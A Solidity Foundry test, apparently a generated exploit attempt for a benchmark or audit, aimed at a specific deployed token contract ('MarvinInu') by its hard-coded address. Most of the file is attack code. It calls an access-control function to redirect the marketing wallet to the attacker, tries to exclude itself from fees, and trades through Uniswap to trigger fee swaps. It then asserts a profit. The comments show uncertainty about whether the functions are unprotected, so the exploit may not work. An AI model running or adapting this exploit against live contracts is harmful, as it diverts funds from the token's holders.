import "forge-std/Test.sol";

// Minimal interfaces needed
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface MarvinInu {
    function updateMarketingWallet(address newMarketingWallet) external;
    function updateDevWallet(address newWallet) external;
    function updateSwapEnabled(bool enabled) external;
    function excludeFromFees(address account, bool excluded) external;
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function uniswapV2Pair() external view returns (address);
    function swapEnabled() external view returns (bool);
    function marketingWallet() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to interact with the existing contract on-chain
        // No deployment needed since TARGET is already defined
        // We'll just get some initial ETH and prepare
        vm.deal(attacker, 100 ether);

        // Label addresses for clarity
        vm.label(TARGET, "MarvinInu");
        vm.label(attacker, "Attacker");

        // Get the Uniswap pair address from the contract
        IUniswapV2Pair pair = IUniswapV2Pair(MarvinInu(TARGET).uniswapV2Pair());
        vm.label(address(pair), "UniswapV2Pair");

        // Get router address
        address router = address(MarvinInu(TARGET).uniswapV2Router());
        vm.label(router, "UniswapV2Router");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Step 1: Try to enable swap if not already enabled
        // The hint says updateSwapEnabled can be called by anyone
        // But in the provided code it's onlyOwner - we try anyway
        // If it reverts, we continue (maybe already enabled)
        try MarvinInu(TARGET).updateSwapEnabled(true) {} catch {}

        // Step 2: Change marketing wallet to attacker
        // This should be the unprotected function
        MarvinInu(TARGET).updateMarketingWallet(attacker);

        // Step 3: Get some MARVIN tokens to sell
        // We need to buy from Uniswap pair first
        // Approve router to spend our ETH
        // We'll swap ETH for MARVIN tokens

        // First, check if we're excluded from fees (we might need to be)
        // Try to call excludeFromFees(attacker, true) - might be unprotected too
        try MarvinInu(TARGET).excludeFromFees(attacker, true) {} catch {}

        // Buy some MARVIN tokens
        address[] memory path = new address[](2);
        path[0] = MarvinInu(TARGET).uniswapV2Router().WETH();
        path[1] = TARGET;

        uint256 amountToSpend = 10 ether;

        // Use the router directly
        IUniswapV2Router02 router = MarvinInu(TARGET).uniswapV2Router();
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountToSpend}(
            0, // minimum amount out
            path,
            attacker,
            block.timestamp
        );

        // Step 4: Now sell MARVIN tokens to generate fees
        uint256 marvinBalance = IERC20(TARGET).balanceOf(attacker);
        // Approve router to spend our MARVIN tokens
        IERC20(TARGET).approve(address(router), marvinBalance);

        // Swap MARVIN for ETH
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            marvinBalance,
            0, // minimum amount out
            sellPath,
            attacker,
            block.timestamp
        );

        // The sell should generate fees that accumulate in the contract
        // If swapEnabled is true and contract token balance >= swapTokensAtAmount,
        // swapBack() should be triggered automatically

        // Alternatively, we could try to trigger swapBack directly if we have enough tokens
        // But swapBack() is private, so we need to trigger via _transfer

        // Let's also try to transfer tokens to another address to potentially trigger swapBack
        // if the contract has accumulated fees from previous transactions

        // Check if contract has token balance
        uint256 contractTokenBalance = IERC20(TARGET).balanceOf(TARGET);
        if (contractTokenBalance > 0) {
            // Try to trigger swap by transferring tokens (but we need to not be excluded from fees)
            // Transfer to ourselves might not trigger if we're excluded
            // Let's create a new address and transfer to it
            address dummy = address(0x123);
            // We need some tokens to transfer
            // Actually, we just sold all, so we need to buy a small amount again

            // Update path for buying
            address[] memory buyPath = new address[](2);
            buyPath[0] = router.WETH();
            buyPath[1] = TARGET;

            router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
                0,
                buyPath,
                attacker,
                block.timestamp
            );

            // Now transfer to dummy address
            uint256 smallAmount = IERC20(TARGET).balanceOf(attacker) / 10;
            IERC20(TARGET).transfer(dummy, smallAmount);
        }

        // Check if we received any ETH
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

